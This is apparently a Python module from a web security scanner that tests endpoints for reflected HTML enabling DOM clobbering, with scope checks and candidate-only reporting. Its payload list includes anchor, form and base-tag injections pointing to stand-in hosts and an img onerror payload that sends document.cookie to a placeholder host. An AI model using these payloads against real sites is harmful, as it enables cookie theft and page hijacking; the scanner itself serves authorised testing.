"""DOM Clobbering scanner — detects id/name-based JavaScript variable pollution via reflected HTML injection points."""
from __future__ import annotations
import asyncio
import random
import re
import string
from typing import Any
from talisman.engine.scope import ScopeViolationError\nfrom talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

DOMC_CANARY_PREFIX = "TLSMDOMC"

# HTML injection test points — common reflected input locations
HTML_INJECTION_ENDPOINTS = [
    "/search", "/api/search",
    "/api/user", "/api/profile",
    "/api/config", "/api/settings",
    "/api/echo", "/api/debug",
    "/api/render", "/api/display",
]

# DOM Clobbering payloads — injects HTML elements with id/name that
# collide with common JavaScript variable names used by frameworks
DOM_CLOBBERING_PAYLOADS = [
    # Anchor tag with href (classic: window.config = {href: 'evil.js'})
    ('<a id="canaryID" href="https://talisman.invalid/malicious.js">click</a>', "Anchor element clobbering"),
    ('<a id="canaryID" name="canaryID" href="https://talisman.invalid/malicious.js">click</a>', "Anchor name + id clobbering"),
    # Form element with action
    ('<form id="canaryID" action="https://talisman.invalid/steal"></form>', "Form action clobbering"),
    ('<form name="canaryID" action="https://talisman.invalid/steal"></form>', "Form name clobbering"),
    # Base tag (can redirect all relative URLs)
    ('<base id="canaryID" href="https://talisman.invalid/">', "Base tag clobbering"),
    # Script-like elements without being script
    ('<img id="canaryID" src="x" onerror="fetch(\'https://talisman.invalid/\'%2Bdocument.cookie)">', "Img onerror clobbering"),
    # Overwriting document API
    ('<a id="cookie" href="https://evil.com">cookie</a>', "document.cookie clobbering"),
    ('<a id="getElementById" href="https://evil.com">getElementById</a>', "document.getElementById clobbering"),
    # Multiple nested clobbering
    ('<form id="canaryID"><input name="default" value="clobbered"></form>', "Form child element clobbering"),
    # Iframe name-based
    ('<iframe name="canaryID" src="https://evil.com"></iframe>', "Iframe name clobbering"),
]


async def _test_dom_clobbering(
    url: str, endpoint: str, client: TalismanHTTPClient,
    allow_post_probes: bool = False,
) -> list[dict[str, Any]]:
    """Test for DOM Clobbering by injecting HTML elements and checking reflection.

    The key insight: if the server reflects our injected HTML element's id/name
    attribute in the response, AND that id/name matches a common JS variable name,
    a DOM Clobbering gadget exists on the client side.
    """
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint

    for payload, description in DOM_CLOBBERING_PAYLOADS:
        # Replace canaryID with a unique canary
        canary_id = f"{DOMC_CANARY_PREFIX}{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        test_payload = payload.replace("canaryID", canary_id)

        # Try multiple insertion points
        test_variants = [
            {"q": test_payload},
            {"query": test_payload},
            {"name": test_payload},
            {"input": test_payload},
            {"data": test_payload},
            {"search": test_payload},
            {"callback": test_payload},
            {"redirect": test_payload},
            {"url": test_payload},
            {"message": test_payload},
        ]

        # Determine method based on endpoint
        method = "GET" if "/search" in endpoint or "/echo" in endpoint else "POST"
        if method == "POST" and not allow_post_probes:
            continue

        for params in test_variants:
            try:
                if method == "GET":
                    r = await client.get(test_url, params=params, timeout=8)
                else:
                    r = await client.post(test_url, json=params,
                        headers={"Content-Type": "application/json"}, timeout=8)

                resp_text = r.text

                # Check if our payload is reflected in the response
                if canary_id in resp_text:
                    # Determine what type of clobbering vector this is
                    clobbering_type = "unknown"
                    if 'href="https://evil.com' in resp_text:
                        clobbering_type = "anchor_href_clobbering"
                    elif 'action="https://evil.com' in resp_text:
                        clobbering_type = "form_action_clobbering"
                    elif 'base' in payload.lower():
                        clobbering_type = "base_tag_clobbering"
                    elif 'cookie' in payload.lower() and 'getElementById' not in payload:
                        clobbering_type = "cookie_clobbering"
                    elif 'getElementById' in payload.lower():
                        clobbering_type = "api_clobbering"
                    elif 'onerror' in payload.lower():
                        clobbering_type = "event_handler_clobbering"
                    else:
                        clobbering_type = "generic_html_clobbering"

                    findings.append({
                        "type": clobbering_type,
                        "endpoint": endpoint,
                        "payload_preview": test_payload[:100],
                        "description": description,
                        "canary_id": canary_id,
                        "param": list(params.keys())[0],
                        "evidence": f"Parsed HTML element with id='{canary_id}' reflected at {endpoint} via param {list(params.keys())[0]}",
                    })
                    break  # One finding per payload is enough
            except Exception:
                pass

        if any(f.get("canary_id") == canary_id for f in findings):
            continue  # Found for this payload, move to next

    return findings


async def _test_dom_clobbering_sinks(
    url: str, endpoint: str, client: TalismanHTTPClient,
    allow_post_probes: bool = False,
) -> list[dict[str, Any]]:
    """Test for DOM Clobbering that specifically targets common JS sinks.

    We inject HTML that overwrites common JS variable names used by frameworks
    like `window.config`, `window.SITE_CONFIG`, etc.
    """
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint

    common_sinks = [
        "config", "settings", "options", "globals",
        "globalConfig", "appConfig", "siteConfig",
        "env", "environment", "runtime",
        "baseUrl", "apiBase", "apiUrl",
        "csrfToken", "nonce", "state",
    ]

    for sink in common_sinks[:6]:
        canary_url = f"https://talisman-canary-{''.join(random.choices(string.ascii_lowercase, k=6))}.invalid/malicious.js"
        payload = f'<a id="{sink}" href="{canary_url}">clobber</a>'

        test_variants = [
            ({"q": payload}, "GET"),
            ({"input": payload}, "POST"),
            ({"name": payload}, "POST"),
        ]

        for params, method in test_variants:
            if method == "POST" and not allow_post_probes:
                continue
            try:
                if method == "GET":
                    r = await client.get(test_url, params=params, timeout=8)
                else:
                    r = await client.post(test_url, json=params, timeout=8)

                if canary_url in r.text:
                    findings.append({
                        "type": "sink_clobbering",
                        "endpoint": endpoint,
                        "sink": sink,
                        "payload": payload[:80],
                        "canary_url": canary_url,
                        "evidence": f"window.{sink} clobberable via injected HTML element",
                    })
                    break
            except Exception:
                pass

    return findings


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    """Find HTML reflection candidates without claiming browser-side clobbering."""
    url = target if "://" in target else f"https://{target}"
    if scope is None:
        return {
            "target": url, "findings": [], "candidates": [], "count": 0,
            "candidate_count": 0, "error": "scope_enforcer_required",
        }
    scope.assert_in_scope(url)

    allow_post_probes = False
    try:
        scope.assert_destructive_allowed(url, "POST")
        allow_post_probes = True
    except ScopeViolationError:
        pass

    console.print(
        f"\n[module][+] DOM Clobbering Candidate Scanner[/module] -> [target]{url}[/target]"
    )
    candidates: list[dict[str, Any]] = []
    async with TalismanHTTPClient(proxy=proxy, timeout=12, scope=scope) as client:
        for endpoint in HTML_INJECTION_ENDPOINTS:
            for candidate in await _test_dom_clobbering(
                url, endpoint, client, allow_post_probes=allow_post_probes
            ):
                candidates.append({
                    **candidate,
                    "confidence": "candidate",
                    "requires_browser_verification": True,
                    "verification_required": (
                        "Confirm the response is parsed as active HTML in a browser, "
                        "identify a real DOM-clobbering gadget in application code, "
                        "and demonstrate a security-relevant effect. Reflection of "
                        "an id/name attribute alone is not DOM clobbering impact."
                    ),
                })

            for candidate in await _test_dom_clobbering_sinks(
                url, endpoint, client, allow_post_probes=allow_post_probes
            ):
                candidates.append({
                    **candidate,
                    "confidence": "candidate",
                    "requires_browser_verification": True,
                    "verification_required": (
                        "Demonstrate that application JavaScript reads the clobbered "
                        "named property and that this changes a security-relevant "
                        "decision or resource load."
                    ),
                })

    console.print(
        f"  DOM-clobbering scan complete -- {len(candidates)} reflection candidates"
    )
    return {
        "target": url,
        "findings": [],
        "candidates": candidates,
        "count": 0,
        "candidate_count": len(candidates),
        "post_probes_enabled": allow_post_probes,
    }
